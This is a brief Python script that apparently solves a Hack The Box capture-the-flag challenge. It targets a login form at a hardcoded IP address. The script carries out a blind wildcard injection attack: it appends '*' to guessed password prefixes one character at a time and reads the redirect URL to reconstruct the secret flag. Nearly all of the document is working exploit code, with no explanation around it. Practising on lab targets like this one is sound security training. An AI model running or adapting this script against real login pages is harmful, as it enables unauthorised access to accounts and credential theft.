import requests
import string

headers = {"UserAgent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}
url = "http://159.65.63.151:31293/login"

chars = string.ascii_letters
chars += ''.join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])

counter = 0
flag = "HTB{"

while True:
    if counter == len(chars):
        print(flag + "}")
        break

    password = flag + chars[counter] + "*"
    print("I am trying this: ", password)

    data = {"username":"Reese", "password" : password}
    response = requests.post(url, headers=headers, data=data)

    if (response.url != url + "?message=Authentication%20failed"):
        flag += chars[counter]
        counter = 0
    else:
        counter += 1
